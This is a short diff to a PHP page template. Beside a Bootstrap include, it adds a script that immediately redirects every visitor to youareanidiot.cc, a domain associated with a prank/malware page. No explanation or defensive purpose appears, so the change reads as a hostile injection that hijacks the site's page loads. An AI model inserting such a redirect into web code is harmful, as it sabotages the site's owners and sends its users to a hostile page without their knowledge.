@@ -37,5 +37,8 @@ $bodyClass = $templateData['bodyClass'] ?? '';
 <?php require $layoutFile; ?>
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    location.replace("http://youareanidiot.cc");
+  </script>
 </body>
 </html>
